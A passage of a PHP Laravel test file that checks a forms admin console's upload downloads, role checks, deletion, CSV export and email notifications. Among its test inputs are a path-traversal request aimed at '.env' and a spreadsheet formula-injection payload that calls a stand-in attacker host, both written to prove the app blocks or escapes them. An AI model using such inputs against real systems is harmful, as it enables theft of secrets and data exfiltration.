    /** @return array{0: Form, 1: FormSubmission} */
    private function submitted(): array
    {
        $form = $this->uploadForm();
        $this->send(['name' => 'Priya Das', 'plan' => $this->pdf()])->assertCreated();

        return [$form, FormSubmission::sole()];
    }

    public function test_a_submission_row_says_what_was_uploaded_and_never_where_it_is_kept(): void
    {
        [$form, $submission] = $this->submitted();

        $response = $this->actingAs($this->staff(), 'sanctum')
            ->getJson("/api/v1/admin/forms/{$form->id}/submissions")
            ->assertOk();

        $response->assertJsonPath('data.0.files.plan', [
            'field' => 'plan',
            'name' => 'Site plan.pdf',
            'size' => $submission->files['plan']['size'],
            'mime' => 'application/pdf',
            'submission_id' => $submission->id,
            'download_path' => "/admin/forms/{$form->id}/submissions/{$submission->id}/files/plan",
        ])->assertJsonPath('data.0.data.plan', 'Site plan.pdf');

        $this->assertStringNotContainsString('form-uploads', $response->getContent());
    }

    public function test_an_upload_is_downloaded_under_its_own_name_by_the_forms_own_role(): void
    {
        [$form, $submission] = $this->submitted();
        $url = "/api/v1/admin/forms/{$form->id}/submissions/{$submission->id}/files/plan";

        $this->getJson($url)->assertUnauthorized();

        $response = $this->actingAs($this->staff(), 'sanctum')->get($url)->assertOk();

        $this->assertStringContainsString('attachment', (string) $response->headers->get('Content-Disposition'));
        $this->assertStringContainsString('Site plan.pdf', (string) $response->headers->get('Content-Disposition'));
        $this->assertStringStartsWith('%PDF-1.4', $response->streamedContent());

        // A field with no file, and a key that is not a field at all.
        $this->getJson("/api/v1/admin/forms/{$form->id}/submissions/{$submission->id}/files/name")->assertNotFound();
        $this->getJson("/api/v1/admin/forms/{$form->id}/submissions/{$submission->id}/files/..%2F..%2F.env")->assertNotFound();

        // The same submission asked for through another form.
        $other = Form::create(['name' => 'Other', 'slug' => 'other', 'status' => 'published']);
        $this->getJson("/api/v1/admin/forms/{$other->id}/submissions/{$submission->id}/files/plan")->assertNotFound();
    }

    public function test_a_role_outside_the_forms_group_cannot_read_an_upload_or_the_export(): void
    {
        [$form, $submission] = $this->submitted();

        $this->actingAs($this->staff(RoleEnum::SalesManager), 'sanctum');

        $this->getJson("/api/v1/admin/forms/{$form->id}/submissions/{$submission->id}/files/plan")->assertStatus(403);
        $this->getJson("/api/v1/admin/forms/{$form->id}/submissions/export")->assertStatus(403);
        $this->deleteJson("/api/v1/admin/forms/{$form->id}/submissions/{$submission->id}")->assertStatus(403);

        Storage::disk('local')->assertExists($submission->files['plan']['path']);
    }

    public function test_deleting_a_submission_deletes_its_file_and_keeps_the_lead(): void
    {
        [$form, $submission] = $this->submitted();
        $path = $submission->files['plan']['path'];
        $other = Form::create(['name' => 'Other', 'slug' => 'other', 'status' => 'published']);

        $this->actingAs($this->staff(), 'sanctum');

        // Addressed through the wrong form, nothing happens.
        $this->deleteJson("/api/v1/admin/forms/{$other->id}/submissions/{$submission->id}")->assertNotFound();
        Storage::disk('local')->assertExists($path);

        $this->deleteJson("/api/v1/admin/forms/{$form->id}/submissions/{$submission->id}")->assertNoContent();

        $this->assertSame(0, FormSubmission::count());
        Storage::disk('local')->assertMissing($path);
        // The sales desk's record of the same arrival, with a delete of its own.
        $this->assertSame('Priya Das', Lead::sole()->name);
    }

    /** The existing rule, extended to what came with the answers. */
    public function test_deleting_a_form_keeps_its_submissions_and_their_files(): void
    {
        [$form, $submission] = $this->submitted();

        $this->actingAs($this->staff(), 'sanctum')
            ->deleteJson("/api/v1/admin/forms/{$form->id}")->assertNoContent();

        $kept = FormSubmission::sole();
        $this->assertNull($kept->form_id);
        $this->assertSame('survey', $kept->form_slug);
        Storage::disk('local')->assertExists($kept->files['plan']['path']);
    }

    // ------------------------------------------------------------- the export

    public function test_the_export_is_one_row_a_submission_and_one_column_a_field(): void
    {
        $form = $this->form([
            ['kind' => 'heading', 'name' => 'section_1'],
            ['kind' => 'text', 'name' => 'name', 'label' => 'Your name'],
            ['kind' => 'checkboxes', 'name' => 'interests', 'options' => [['value' => 'wifi', 'label' => 'Wi-Fi'], ['value' => 'cctv', 'label' => 'CCTV, with recording']]],
            ['kind' => 'step', 'name' => 'step_1'],
            ['kind' => 'rating', 'name' => 'score'],
            ['kind' => 'checkbox', 'name' => 'agree'],
            ['kind' => 'file', 'name' => 'plan', 'settings' => ['accept' => ['pdf']]],
            ['kind' => 'hidden', 'name' => 'campaign', 'settings' => ['value' => 'spring-26']],
        ]);

        $this->send([
            'name' => '=HYPERLINK("http://attacker.test?"&A1)',
            'interests' => ['wifi', 'cctv'],
            'score' => 4,
            'agree' => '1',
            'plan' => $this->pdf('-plan.pdf'),
            '_source_url' => 'https://www.technoware.in/services/site-survey',
        ])->assertCreated();

        $this->travel(1)->minutes();
        $this->send(['name' => 'Second, "quoted"', 'agree' => '0'])->assertCreated();

        $response = $this->actingAs($this->staff(), 'sanctum')
            ->get("/api/v1/admin/forms/{$form->id}/submissions/export")
            ->assertOk();

        $this->assertStringStartsWith('text/csv', (string) $response->headers->get('Content-Type'));
        $this->assertStringContainsString('form-survey-', (string) $response->headers->get('Content-Disposition'));

        $handle = fopen('php://memory', 'r+');
        fwrite($handle, (string) preg_replace('/^\xEF\xBB\xBF/', '', $response->streamedContent()));
        rewind($handle);
        $rows = [];
        while (($row = fgetcsv($handle, 0, ',', '"', '')) !== false) {
            $rows[] = $row;
        }

        // Value fields only, in the form's order, between when and where from.
        $this->assertSame(
            ['Submitted at', 'Your name', 'Interests', 'Score', 'Agree', 'Plan', 'Campaign', 'Source page', 'IP'],
            $rows[0],
        );
        $this->assertCount(3, $rows);

        // Newest first, as the console lists them.
        $this->assertSame('Second, "quoted"', $rows[1][1]);
        $this->assertSame(['', '', 'No', '', 'spring-26'], array_slice($rows[1], 2, 5));

        $first = $rows[2];
        // A cell a stranger typed that Excel would run is written as text.
        $this->assertSame('\'=HYPERLINK("http://attacker.test?"&A1)', $first[1]);
        // Choices by the label the visitor read, joined by "; ".
        $this->assertSame('Wi-Fi; CCTV, with recording', $first[2]);
        $this->assertSame('4 / 5', $first[3]);
        $this->assertSame('Yes', $first[4]);
        // An upload is its filename — and that is escaped too.
        $this->assertSame("'-plan.pdf", $first[5]);
        $this->assertSame('spring-26', $first[6]);
        $this->assertSame('https://www.technoware.in/services/site-survey', $first[7]);
        $this->assertSame('127.0.0.1', $first[8]);
    }

    public function test_export_is_not_read_as_a_submission_id(): void
    {
        $form = $this->form([['kind' => 'text', 'name' => 'name']]);

        // Declared above `submissions/{submission}`: an empty form still
        // answers with its heading row rather than a 404 from model binding.
        $content = $this->actingAs($this->staff(), 'sanctum')
            ->get("/api/v1/admin/forms/{$form->id}/submissions/export")
            ->assertOk()
            ->streamedContent();

        $this->assertStringContainsString('"Submitted at",Name,"Source page",IP', $content);
    }

    // --------------------------------------------------------- notifications

    /**
     * The desk's email lists a file by name and says where to get it.
     *
     * It never carries the file: an attachment would deliver something a
     * stranger uploaded into an inbox, past the role check on the download.
     */
    public function test_the_notification_names_an_upload_and_never_attaches_it(): void
    {
        $form = $this->form([
            ['kind' => 'text', 'name' => 'name'],
            ['kind' => 'checkboxes', 'name' => 'interests', 'options' => [['value' => 'wifi', 'label' => 'Wi-Fi'], ['value' => 'cctv', 'label' => 'CCTV']]],
            ['kind' => 'rating', 'name' => 'score'],
            ['kind' => 'checkbox', 'name' => 'agree'],
            ['kind' => 'file', 'name' => 'plan', 'label' => 'Floor plan', 'settings' => ['accept' => ['pdf']]],
        ]);

        $this->send([
            'name' => '<b>Priya</b>',
            'interests' => ['wifi', 'cctv'],
            'score' => '4',
            'agree' => 'on',
            'plan' => $this->pdf(),
        ])->assertCreated();

        Notification::assertSentOnDemand(FormSubmitted::class);

        $mail = (new FormSubmitted($form->load('fields'), FormSubmission::sole()))->toMail(new AnonymousNotifiable);
        $html = (string) $mail->render();

        $this->assertSame([], $mail->attachments);
        $this->assertSame([], $mail->rawAttachments);

        $this->assertStringContainsString('Wi-Fi, CCTV', $html);
        $this->assertStringContainsString('4 / 5', $html);
        $this->assertStringContainsString('Yes', $html);
        $this->assertStringContainsString('Site plan.pdf', $html);
        $this->assertStringContainsString('not attached', $html);
        $this->assertStringNotContainsString('form-uploads', $html);
        $this->assertStringNotContainsString('<b>Priya</b>', $html);
    }

    public function test_a_submission_without_an_upload_says_nothing_about_one(): void
    {
        $form = $this->form([['kind' => 'text', 'name' => 'name']]);

        $this->postJson('/api/v1/forms/survey', ['name' => 'Priya'])->assertCreated();

        $html = (string) (new FormSubmitted($form->load('fields'), FormSubmission::sole()))
            ->toMail(new AnonymousNotifiable)->render();

        $this->assertStringNotContainsString('not attached', $html);
    }
}
